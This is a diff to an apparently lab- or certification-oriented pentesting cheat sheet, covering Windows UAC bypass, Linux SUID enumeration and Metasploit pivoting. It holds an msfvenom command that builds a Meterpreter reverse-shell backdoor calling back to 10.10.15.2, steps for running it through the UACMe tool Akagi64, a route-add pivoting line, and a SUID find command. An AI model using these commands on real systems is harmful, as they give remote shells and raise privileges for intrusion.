@@ -108,11 +108,8 @@
         - Upload both backdoor.exe and UACMe executable
         - Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
         
-##### 6.1.4 SUID
-    - Using the UACMe framework
-        - Generate backdoor : msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.2 LPORT=4444 -f exe > 'backdoor.exe'
-        - Upload both backdoor.exe and UACMe executable
-        - Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
+##### 6.1.4 SUID (Linux)
+    - find / -perm -u=s -type f 2>/dev/null
 
 #### 6.2 Pivoting
     From MSF Console          : route add 192.168.4.0 (subnet) 255.255.255.0(mask) 6(session)
